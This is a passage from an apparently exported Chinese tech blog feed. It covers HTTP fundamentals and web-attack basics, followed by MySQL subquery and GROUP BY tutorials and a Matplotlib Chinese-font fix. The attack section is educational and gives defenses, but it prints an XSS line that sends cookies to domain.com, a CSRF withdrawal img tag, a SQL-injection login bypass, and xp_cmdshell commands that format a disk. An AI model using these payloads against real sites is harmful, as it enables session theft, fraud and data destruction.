方法。HEAD获取报文首部和 GET 方法一样，但是不返回报文实体主体部分。主要用于确认 URL 的有效性以及资源更新的日期时间等。POST传输实体主体POST 主要用来传输数据，而 GET 主要用来获取资源。更多 POST 与 GET 的比较请见第八章。PUT上传文件由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt;PATCH对资源进行部分修改PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: "e0023aa4e"Content-Length: 100[description of changes]DELETE删除文件与 PUT 功能相反，并且同样不带验证机制。1DELETE /file.html HTTP/1.1OPTIONS查询支持的方法查询指定的 URL 能够支持的方法。会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。CONNECT要求用隧道协议连接代理要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。1CONNECT www.example.com:443 HTTP/1.1TRACE追踪路径服务器会将通信路径返回给客户端。发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。三、HTTP 状态码服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。状态码类别原因短语1XXInformational（信息性状态码）接收的请求正在处理2XXSuccess（成功状态码）请求正常处理完毕3XXRedirection（重定向状态码）需要进行附加操作以完成请求4XXClient Error（客户端错误状态码）服务器无法处理请求5XXServer Error（服务器错误状态码）服务器处理请求出错1XX 信息100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。2XX 成功200 OK204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。206 Partial Content ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。3XX 重定向301 Moved Permanently ：永久性重定向302 Found ：临时性重定向303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。4XX 客户端错误400 Bad Request ：请求报文中存在语法错误。401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。403 Forbidden ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。404 Not Found5XX 服务器错误500 Internal Server Error ：服务器正在执行请求时发生错误。503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。四、HTTP 首部有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。各种首部字段及其含义如下（不需要全记，仅供查阅）：通用首部字段首部字段名说明Cache-Control控制缓存的行为Connection控制不再转发给代理的首部字段、管理持久连接Date创建报文的日期时间Pragma报文指令Trailer报文末端的首部一览Transfer-Encoding指定报文主体的传输编码方式Upgrade升级为其他协议Via代理服务器的相关信息Warning错误通知请求首部字段首部字段名说明Accept用户代理可处理的媒体类型Accept-Charset优先的字符集Accept-Encoding优先的内容编码Accept-Language优先的语言（自然语言）AuthorizationWeb 认证信息Expect期待服务器的特定行为From用户的电子邮箱地址Host请求资源所在服务器If-Match比较实体标记（ETag）If-Modified-Since比较资源的更新时间If-None-Match比较实体标记（与 If-Match 相反）If-Range资源未更新时发送实体 Byte 的范围请求If-Unmodified-Since比较资源的更新时间（与 If-Modified-Since 相反）Max-Forwards最大传输逐跳数Proxy-Authorization代理服务器要求客户端的认证信息Range实体的字节范围请求Referer对请求中 URI 的原始获取方TE传输编码的优先级User-AgentHTTP 客户端程序的信息响应首部字段首部字段名说明Accept-Ranges是否接受字节范围请求Age推算资源创建经过时间ETag资源的匹配信息Location令客户端重定向至指定 URIProxy-Authenticate代理服务器对客户端的认证信息Retry-After对再次发起请求的时机要求ServerHTTP 服务器的安装信息Vary代理服务器缓存的管理信息WWW-Authenticate服务器对客户端的认证信息实体首部字段首部字段名说明Allow资源可支持的 HTTP 方法Content-Encoding实体主体适用的编码方式Content-Language实体主体的自然语言Content-Length实体主体的大小Content-Location替代对应资源的 URIContent-MD5实体主体的报文摘要Content-Range实体主体的位置范围Content-Type实体主体的媒体类型Expires实体主体过期的日期时间Last-Modified资源的最后修改日期时间五、具体应用CookieHTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。Cookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。1. 创建过程服务器发送的响应报文包含 Set-Cookie 字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。123456HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content]客户端之后发送请求时，会从浏览器中读出 Cookie 值，在请求报文中包含 Cookie 字段。123GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry2. 分类会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;3. Set-Cookie属性说明NAME=VALUE赋予 Cookie 的名称和其值（必需项）expires=DATECookie 的有效期（若不明确指定则默认为浏览器关闭前为止）path=PATH将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录）domain=域名作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）Secure仅在 HTTPs 安全通信时才会发送 CookieHttpOnly加以限制，使 Cookie 不能被 JavaScript 脚本访问4. Session 和 Cookie 区别Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。5. 浏览器禁用 Cookie 的情况会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。6. 使用 Cookie 实现用户名和密码的自动填写网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。但是如果 Set-Cookie 指定了 HttpOnly 属性，就无法通过 Javascript 脚本获取 Cookie 信息，这是出于安全性考虑。缓存1. 优点降低服务器的负担；提高响应速度（缓存资源比服务器上的资源离客户端更近）。2. 实现方法让代理服务器进行缓存；让客户端浏览器进行缓存。3. Cache-Control 字段HTTP 通过 Cache-Control 首部字段来控制缓存。1Cache-Control: private, max-age=0, no-cache4. no-cache 指令该指令出现在请求报文的 Cache-Control 字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期；该指令出现在响应报文的 Cache-Control 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性。5. no-store 指令该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。no-cache 不表示不缓存，而是缓存之前需要先进行验证，no-store 才是不进行缓存。6. max-age 指令该指令出现在请求报文的 Cache-Control 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。该指令出现在响应报文的 Cache-Control 字段中，表示缓存资源在缓存服务器中保存的时间。Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。持久连接当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。持久连接需要使用 Connection 首部字段进行管理。HTTP/1.1 开始 HTTP 默认是持久化连接的，如果要断开 TCP 连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是非持久化连接的，如果要维持持续连接，需要使用 Connection : Keep-Alive。管线化处理HTTP/1.1 支持管线化处理，可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。编码编码（Encoding）主要是为了对实体进行压缩。常用的编码有：gzip、compress、deflate、identity，其中 identity 表示不执行压缩的编码格式。分块传输编码Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。多部分对象集合一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。例如，上传多个表单时可以使用如下方式：123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="submit-name"Larry--AaB03xContent-Disposition: form-data; name="files"; filename="file1.txt"Content-Type: text/plain... contents of file1.txt ...--AaB03x--范围请求如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-102312345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content)内容协商通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。涉及以下首部字段：Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。虚拟主机HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。使用 Host 首部字段进行处理。通信数据转发1. 代理代理服务器接受客户端的请求，并且转发给其它服务器。使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。 2. 网关与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。3. 隧道使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析 HTTP 请求。六、HTTPsHTTP 有以下安全性问题：使用明文进行通信，内容可能会被窃听；不验证通信方的身份，通信方的身份有可能遭遇伪装；无法证明报文的完整性，报文有可能遭篡改。HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。加密1. 对称密钥加密对称密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。优点：运算速度快；缺点：密钥容易被获取。2. 公开密钥加密公开密钥加密（Public-Key Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。优点：更为安全；缺点：运算速度慢；3. HTTPs 采用的加密方式HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key 就是对称密钥）认证通过使用 证书 来对通信方进行认证。数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。进行 HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。完整性SSL 提供报文摘要功能来验证完整性。七、Web 攻击技术攻击模式1. 主动攻击直接攻击服务器，具有代表性的有 SQL 注入和 OS 命令注入。2. 被动攻击设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。跨站脚本攻击1. 概念跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。例如有一个论坛网站，攻击者可以在上面发表以下内容：1&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;之后该内容可能会被渲染成以下形式：1&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。2. 危害伪造虚假的输入表单骗取个人信息窃取用户的 Cookie 值显示伪造的文章或者图片3. 防范手段（一）过滤特殊字符许多语言都提供了对 HTML 的过滤：PHP 的 htmlentities() 或是 htmlspecialchars()。Python 的 cgi.escape()。Java 的 xssprotect (Open Source Library)。Node.js 的 node-validator。（二）指定 HTTP 的 Content-Type通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：123&lt;?php header('Content-Type: text/javascript; charset=utf-8');?&gt;跨站点请求伪造1. 概念跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。假如一家银行用以执行转账操作的 URL 地址如下：1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。那么，一个恶意攻击者可以在另一个网站上放置如下代码：1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。2. 防范手段（一）检查 Referer 字段HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。（二）添加校验 Token由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。SQL 注入攻击1. 概念服务器上的数据库运行非法的 SQL 语句。2. 攻击原理例如一个网站登录验证的 SQL 查询代码为：1strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"如果填入以下内容：12userName = "1' OR '1'='1";passWord = "1' OR '1'='1";那么 SQL 查询字符串为：1strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"此时无需验证通过就能执行以下查询：1strSQL = "SELECT * FROM users;"3. 危害数据表中的数据外泄，例如个人机密数据，账户数据，密码等。数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell “net stop iisadmin” 可停止服务器的 IIS 服务）。破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell “FORMAT C:”）。4. 防范手段在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。使用 SQL 防注入系统。拒绝服务攻击1. 概念拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。维基百科：拒绝服务攻击八、GET 和 POST 的区别参数GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体中。GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2安全安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。安全的方法除了 GET 之外还有：HEAD、OPTIONS。不安全的方法除了 POST 之外还有 PUT、DELETE。幂等性幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。GET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的：1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1POST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录：123POST /add_row HTTP/1.1POST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd rowDELETE /idX/delete HTTP/1.1 是幂等的，即便是不同请求之间接收到的状态码不一样：123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404可缓存如果要对响应进行缓存，需要满足以下条件：请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。响应报文的 Cache-Control 首部字段没有指定不进行缓存。XMLHttpRequest为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。九、各版本比较HTTP/1.0 与 HTTP/1.1 的区别HTTP/1.1 默认是持久连接HTTP/1.1 支持管线化处理HTTP/1.1 支持虚拟主机HTTP/1.1 新增状态码 100HTTP/1.1 支持分块传输编码HTTP/1.1 新增缓存处理指令 max-age具体内容见上文HTTP/1.1 与 HTTP/2.0 的区别1. 多路复用HTTP/2.0 使用多路复用技术，使用同一个 TCP 连接来处理多个请求。2. 首部压缩HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。3. 服务端推送在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端。4. 二进制格式HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。参考资料上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014.MDN : HTTPAre http:// and www really necessary?HTTP (HyperText Transfer Protocol)Web-VPN: Secure Proxies with SPDY &amp; ChromeFile:HTTP persistent connection.svgProxy serverWhat Is This HTTPS/SSL Thing And Why Should You Care?What is SSL Offloading?Sun Directory Server Enterprise Edition 7.0 Reference - Key EncryptionAn Introduction to Mutual SSL AuthenticationThe Difference Between URLs and URIs维基百科：跨站脚本维基百科：SQL 注入攻击维基百科：跨站点请求伪造维基百科：拒绝服务攻击What is the difference between a URI, a URL and a URN?XMLHttpRequestXMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?Symmetric vs. Asymmetric Encryption – What are differences?]]></content>
      <categories>
        <category>计算机基础</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL嵌套子查询和相关子查询执行过程的区别]]></title>
    <url>%2Farchives%2Faf2fef58.html</url>
    <content type="text"><![CDATA[子查询可以分为 相关子查询 和 嵌套子查询 两类。一、本文用到的测试数据假设Books表如下：类编号图书名出版社价格2c#高级应用圣通出版23.002Jsp开发应用机械出版社45.003高等数学济南出版社25.003疯狂英语清华大学出版社32.00二、嵌套子查询嵌套子查询的执行不依赖于外部的查询。执行过程：（1）执行子查询，其结果不被显示，而是传递给外部查询，作为外部查询的条件使用。（2）执行外部查询，并显示整个结果。嵌套子查询一般可以分为：返回单值的子查询 和 返回一个列表的子查询。1、返回单值查询所有价格高于平均价格的图书名，作者，出版社和价格。1234567SELECT 图书名，作者，出版社，价格FROM BooksWHERE 价格 &gt;( SELECT AVG(价格) FROM Books);2、返回值列表查询所有借阅图书的读者信息1234567SELECT *FROM ReadersWHERE 读者编号 IN( SELECT 读者编号 FROM [Borrow History])三、相关子查询相关子查询的执行依赖于外部查询。多数情况下是子查询的WHERE子句中引用了外部查询的表。执行过程：（1）从外层查询中取出一个元组，将元组相关列的值传给内层查询。（2）执行内层查询，得到子查询操作的值。（3）外查询根据子查询返回的结果或结果集得到满足条件的行。（4）然后外层查询取出下一个元组重复做步骤1-3，直到外层的元组全部处理完毕。1、相关子查询的例子查询Books表中大于该类图书价格平均值的图书信息12345678SELECT 图书名,出版社,类编号,价格FROM Books As aWHERE 价格 &gt;( SELECT AVG(价格) FROM Books AS b WHERE a.类编号=b.类编号)与前面介绍过的子查询不同，相关子查询无法独立于外部查询而得到解决。该子查询需要一个“类编号”的值。而这个值是个变量，随MySQL检索Books表中的不同行而改变。下面详细说明该查询执行过程：先将Books表中的第一条记录的“类编号”的值“2”代入子查询中，子查询变为：123SELECT AVG(价格)FROM Books AS bWHERE b.类编号=2子查询的结果为该类图书的平均价格，所以外部查询变为：123SELECT 图书名,出版社,类编号,价格FROM Books As aWHERE 价格 &gt; 34如果WHERE条件为True，则第一条结果包括在结果集中，否则不包括。对Books表中的所有行运行相同的过程，最后返回形成的结果集。参考：SQL嵌套子查询和相关子查询的执行过程有什么区别(推荐)]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL中的GROUP BY获取其他字段方法]]></title>
    <url>%2Farchives%2F6ab9ebc9.html</url>
    <content type="text"><![CDATA[除聚集计算语句外，SELECT语句中的每个列都必须在GROUP BY子句中给出。但是有时候，我们又需要在GROUP BY后选出其他列，本文给出了几个方法。创建测试数据CREATE TABLE语句用于创建表，在test数据库下面创建一张名为show_plan的表：123456create table show_plan(id int primary key auto_increment,name varchar(255),desp int,price int);INSERT INTO 语句用于向表格中插入新的行，现在我们向show_plan表中插入一些测试数据：123456789101112insert into show_plan(name,desp,price)values ('a',1,55),('b',1,20),('c',1,63),('b',2,89),('c',2,78),('a',2,90),('b',3,88),('c',3,77),('a',3,100),('d',1,77),('e',4,75);123456789101112131415+----+------+------+-------+| id | name | desp | price |+----+------+------+-------+| 1 | a | 1 | 55 || 2 | b | 1 | 20 || 3 | c | 1 | 63 || 4 | b | 2 | 89 || 5 | c | 2 | 78 || 6 | a | 2 | 90 || 7 | b | 3 | 88 || 8 | c | 3 | 77 || 9 | a | 3 | 100 || 10 | d | 1 | 77 || 11 | e | 4 | 75 |+----+------+------+-------+问题查询出每个演出单位票房最高的剧目名称。分析与解答一个典型的错误做法123select name,desp,MAX(price)from show_plangroup by desp;注意：除聚集计算语句外，SELECT语句中的每个列都必须在GROUP BY子句中给出。这里的select的name列并不在group by子句中。MySQL也会报出如下错误：1ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column &apos;shows.show_plan.name&apos; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by正确做法11234567select a.name,a.desp,b.pricefrom show_plan as a,( select desp,MAX(price) as price from show_plan group by desp) as bwhere a.price = b.price AND a.desp = b.desp;12345678+------+------+-------+| name | desp | price |+------+------+-------+| a | 2 | 90 || a | 3 | 100 || d | 1 | 77 || e | 4 | 75 |+------+------+-------+如果只用price去匹配，假如存在有多个price相同时，例如，desp=1的MAX(price)=77，但是desp=2中也含有price=77的行，那么就会被错误的选择出来。所以要加一个AND a.desp = b.desp筛选条件。正确做法212345678select a.name,a.desp,a.pricefrom show_plan as awhere a.price in ( select MAX(b.price) from show_plan as b where b.desp = a.desp group by b.desp);12345678+------+------+-------+| name | desp | price |+------+------+-------+| a | 2 | 90 || a | 3 | 100 || d | 1 | 77 || e | 4 | 75 |+------+------+-------+同样的，类似方法1，这里最关键的是where b.desp = a.desp这个筛选条件。参考：关于group by 和max函数一起使用的坑]]></content>
      <categories>
        <category>数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Matplotlib中文乱码解决]]></title>
    <url>%2Farchives%2F9e293245.html</url>
    <content type="text"><![CDATA[我在绘图时发现，Matplotlib的图例、标题等无法正常显示中文。本文主要解决这个问题。本文环境：系统：Win10Python版本：3.6中文乱码原因分析matplotlib初始化时首先要加载一个配置文件，其中字体设置也在这个配置文件中。而这个配置文件中没有加入中文字体，所有无法正常显示中文。因此，我们需要在这个配置文件中指定一个可用的中文字体。方法1——绘图时手动修改我们可以在matplotlib绘图时手动加入以下代码来正常显示中文和负号：123456import matplotlib.pyplot as plt# 正常显示中文标签plt.rcParams['font.sans-serif'] = ['SimHei']# 正常显示负号plt.rcParams['axes.unicode_minus'] = False方法2——修改配置文件字体下载我们在Download SimHei Font下载SimHei放在matplotlib的字体文件夹下：1D:\software\Python36\lib\site-packages\matplotlib\mpl-data\fonts\ttf修改matplotlib配置文件首先找到配置文件所在位置，我们可以输入如下代码：12import matplotlibprint(matplotlib.matplotlib_fname())1D:\software\Python36\lib\site-packages\matplotlib\mpl-data\matplotlibrc然后我们修改matplotlibrc文件，去掉font.family和font.sans-serif这两行的注释，并在font.sans-serif这一行中添加我们刚才安装的黑体SimHei，具体如下：12345-#font.family: sans-serif+font.family: sans-serif-#font.sans-serif : DejaVu Sans, Bitstream Vera Sans, Computer Modern Sans Serif, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serif+font.sans-serif : SimHei, DejaVu Sans, Bitstream Vera Sans, Computer Modern Sans Serif, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, 